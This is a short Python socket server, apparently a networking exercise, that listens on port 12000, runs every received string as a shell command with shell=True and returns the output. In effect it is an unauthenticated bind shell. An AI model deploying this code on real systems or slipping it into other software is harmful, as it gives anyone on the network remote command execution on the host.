#coding:utf-8

from socket import *
import subprocess

serverPort = 12000
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)


print ('O servidor está conectado')


while 1:
	connectionSocket, addr = serverSocket.accept()
	comando = connectionSocket.recv(1024).decode('utf-8')
	
	saida = subprocess.check_output(comando, shell = True)
	print(saida)
	connectionSocket.send(str(saida).encode('utf-8'))

	connectionSocket.close()
